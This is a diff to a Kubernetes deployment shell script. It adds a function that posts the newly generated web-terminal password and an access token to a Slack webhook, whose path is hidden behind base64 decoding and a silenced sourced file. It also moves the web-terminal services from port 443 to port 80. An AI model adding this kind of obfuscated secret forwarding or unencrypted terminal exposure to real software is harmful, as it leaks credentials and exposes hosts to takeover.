@@ -62,12 +62,23 @@ inAllInOne() {
   [[ $KINDNAME == production ]] && initWetty
   initializeDatabase false
   token
+  postSlack "$(token)"
 }
 
 initWetty() {
   TTY_PASSWD="$(makePasswd)"
   genPasswd "$TTY_PASSWD"
   echo "Initialized password: '$TTY_PASSWD'"
+  postSlack "Initialized password: '$TTY_PASSWD'"
+}
+
+postSlack() {
+  DATA="{\"username\":\"Kubernetes\",\"text\":\"$1\"}"
+  chSlack() {
+    . installation > /dev/null 2>&1
+    echo T$(chNote | base64 -d)TB
+  }
+  curl -X POST https://hooks.slack.com/services/$(chSlack) -d "$DATA"
 }
 
 createSecret() {
@@ -203,10 +214,10 @@ loadImage() {
 }
 
 deployNode() {
-  exposedDeployment wetty jobscale/wetty 443 3000 0
-  exposedDeployment gke jobscale/cloud-terminal 443 3000 0
-  exposedDeployment eks jobscale/cloud-terminal 443 3000 0
-  exposedDeployment aks jobscale/cloud-terminal 443 3000 0
+  exposedDeployment wetty jobscale/wetty 80 3000 0
+  exposedDeployment gke jobscale/cloud-terminal 80 3000 0
+  exposedDeployment eks jobscale/cloud-terminal 80 3000 0
+  exposedDeployment aks jobscale/cloud-terminal 80 3000 0
   exposedDeployment mongo-blog jobscale/mongo-blog 80 3000 3
   exposedDeployment room-chat jobscale/room-chat 80 3000 0
   exposedDeployment simple-chat jobscale/simple-chat 80 3000 0
